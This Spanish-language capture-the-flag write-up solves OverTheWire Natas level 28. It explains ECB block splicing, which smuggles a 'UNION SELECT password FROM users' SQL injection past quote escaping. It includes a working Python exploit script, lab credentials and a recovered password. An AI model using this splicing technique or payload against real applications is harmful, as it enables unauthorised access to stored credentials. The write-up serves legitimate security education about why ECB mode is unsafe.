# Natas Level28

## Descripción
> **Level Goal (natas28.natas.labs.overthewire.org):** Un buscador de "chistes de informática" (`Whack Computer Joke Database`). No hay enlace a "View sourcecode" — el propio pie de página dice "sorry, we are currently out of sauce". Al enviar una búsqueda, el formulario redirige (HTTP 302) a `search.php/?query=<blob>`, donde `<blob>` es una cadena en base64 que **no se parece en nada** al texto original: es el resultado de **cifrar** la consulta con un cifrado de bloque simétrico antes de meterla en la URL.

## Solución
Sin código fuente visible, hay que trabajar a partir de observaciones del propio comportamiento del cifrado:

- El blob cambia de tamaño en saltos de 16 bytes según la longitud de la consulta enviada — indicio claro de un cifrado de bloque con tamaño de bloque de 16 bytes (típico de AES).
- Si se repite la misma consulta, el blob es idéntico byte a byte, y **bloques idénticos de texto plano producen bloques idénticos de texto cifrado** — esto delata **modo ECB** (Electronic Codebook), el modo de cifrado de bloques más simple y, por eso mismo, inseguro para más de un bloque de datos: al cifrar cada bloque de 16 bytes de forma completamente independiente (sin encadenar con los anteriores), un atacante puede **cortar y recombinar bloques cifrados de peticiones distintas** y el resultado se sigue descifrando bloque a bloque de forma coherente en el servidor.
- La aplicación además **escapa comillas simples** en la consulta (probablemente con algo equivalente a `addslashes()`) **antes** de cifrarla, para evitar inyección SQL directa. Pero como el escapado ocurre antes del cifrado, insertar una comilla dentro de la consulta **desplaza en un byte** todo el texto plano que viene después de ella (por la barra invertida añadida), lo cual desalinea los bloques de 16 bytes a partir de ese punto respecto a una consulta "limpia" de la misma longitud total.

La técnica (un ataque de "manipulación de bloques ECB" o *ECB block splicing*) consiste en:
1. Enviar una consulta de relleno **sin comillas** (p. ej. 10 letras `a`) para obtener bloques cifrados "limpios" que representan fielmente el texto plano de esa longitud, sin ningún desplazamiento por escapado.
2. Enviar una segunda consulta que empiece igual (9 letras `a`, para que los primeros bloques cifren igual que en el caso limpio) y a partir de ahí **sí** incluya una comilla real seguida del payload de inyección SQL deseado (`' UNION SELECT password FROM users; #`), aceptando que el escapado desplazará los bloques posteriores.
3. **Recombinar manualmente los bytes cifrados**: tomar los primeros bloques (limpios, sin desplazar) de la petición (1), y sustituir a partir de cierto punto por los bloques de la petición (2) que contienen ya el payload de inyección cifrado, añadiendo al final los bloques restantes de la petición (1) para mantener una longitud total coherente con lo que el servidor espera poder descifrar sin errores de relleno (padding).
4. Enviar ese blob "Frankenstein" (parte limpio, parte inyectado) como el parámetro `query` de `search.php/?query=...` — el servidor lo descifra bloque a bloque igual que cualquier otro, sin darse cuenta de que es un collage de dos peticiones distintas, y ejecuta la consulta SQL resultante, que ahora contiene nuestra inyección `UNION SELECT` sin escapar.

```python
import requests, base64
from urllib.parse import unquote, quote

auth = ("natas28", "Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3")
url = "http://natas28.natas.labs.overthewire.org/"
session = requests.Session()
block_size = 16

injection = "a"*9 + "' UNION SELECT password FROM users; #"
blocks = (len(injection) - 10) // block_size
if (len(injection) - 10) % block_size != 0:
    blocks += 1

# petición "sucia": trae el payload de inyección cifrado, pero desalineado a partir del byte 9
r = session.post(url, auth=auth, data={"query": injection})
raw_inject = base64.b64decode(unquote(r.url[60:]))

# petición "limpia": 10 letras 'a', sin comillas, para bloques de referencia sin desplazar
r = session.post(url, auth=auth, data={"query": "a"*10})
good_base = base64.b64decode(unquote(r.url[60:]))

# empalmar: bloques limpios (0-2) + bloques con la inyección + resto de bloques limpios
spliced = good_base[:block_size*3] + raw_inject[block_size*3:block_size*3+(blocks*block_size)] + good_base[block_size*3:]
query_param = quote(base64.b64encode(spliced)).replace("/", "%2F")

r = session.get(url + "/search.php/?query=" + query_param, auth=auth)
print(r.text)  # <li>hwgoYUiGWoSZAqphtCAZf7u1jS16KEah</li>
```

## Notas adicionales
- Los desplazamientos concretos (bloque 3, es decir, byte 48) usados en el script son específicos de la estructura interna de la consulta SQL de esta aplicación (el prefijo fijo antes del texto de búsqueda del usuario cabe dentro de los primeros 3 bloques de 16 bytes); se determinaron empíricamente probando varias longitudes de consulta y observando en qué punto empezaban a cambiar los bloques cifrados.
- Este ataque **no rompe el cifrado en sí** (no se recupera la clave ni se descifra nada directamente): explota que el modo ECB cifra cada bloque de forma independiente, permitiendo reordenar/sustituir bloques enteros como si fueran piezas de Lego, sin que el servidor pueda detectar la manipulación.
- Es un ejemplo real y muy citado de por qué **ECB nunca debe usarse para cifrar datos estructurados o de longitud variable**: la ausencia de encadenamiento entre bloques (a diferencia de CBC, CTR, GCM, etc.) hace que el cifrado no oculte patrones ni proteja la integridad del mensaje frente a manipulación por bloques.

## Referencias
- Reto original: http://natas28.natas.labs.overthewire.org/
- Apoyo: https://anyafachri.medium.com/ebc-block-splicing-attack-for-successful-sql-injection-natas28-overthewire-write-up-6e83eb1815ac (explicación detallada del ataque ECB block splicing para este nivel)
- Apoyo: https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas28.py (script de referencia adaptado a Python 3 para esta solución)
- Apoyo: https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB) (por qué el modo ECB es inseguro para más de un bloque de datos)
